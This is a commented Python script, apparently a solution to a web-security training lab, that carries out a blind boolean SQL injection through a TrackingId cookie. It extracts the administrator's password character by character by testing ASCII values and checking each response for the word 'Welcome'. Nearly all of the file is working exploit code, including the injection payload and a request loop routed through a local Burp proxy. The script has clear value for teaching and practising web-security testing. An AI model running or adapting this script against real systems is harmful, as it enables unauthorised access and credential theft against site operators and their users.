# Import necessary libraries
import sys  # For handling command-line arguments
import requests  # For making HTTP requests
import urllib3  # For disabling SSL/TLS warnings
import urllib  # For URL encoding

# Disable SSL/TLS warnings about insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define proxy settings (used for intercepting and analyzing network traffic through BURPsuite)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Function to perform SQL injection attack to extract the administrator's password
def sqli_password(url):
    password_extracted = ""  # Initialize an empty string to store the extracted password
    for i in range(1, 21):  # Loop over the password characters (assumes password length <= 20)
        for j in range(32, 126):  # Loop over ASCII values of printable characters
            # Construct the SQL injection payload for extracting a character of the password
            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i, j)
            
            # URL-encode the payload
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            
            # Craft cookies with the SQL injection payload, (IMPORTANT: obtain your own through BURPsuite)
            cookies = {'TrackingId': 'xXRq8VrmpqajqP4o' + sqli_payload_encoded, 'session': 'FjYbIr93cx7IwFN6TOrrjTtdmr5NZ9BZ'}
            
            # Send the HTTP request with the crafted cookies
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            
            # Check if the SQL injection was successful by analyzing the response
            if "Welcome" not in r.text:
                # If not successful, display the current progress
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                # If successful, append the extracted character to the password and break the loop
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break

# Main function
def main():
    if len(sys.argv) != 2:
        # Print usage instructions and exit if the argument is missing or incorrect
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(1)  # Exit with an error code

    url = sys.argv[1]  # Get the target URL from the command-line argument
    print("(+) Retrieving administrator password...")
    sqli_password(url)  # Call the function to extract the administrator password

# Entry point of the program
if __name__ == "__main__":
    main()
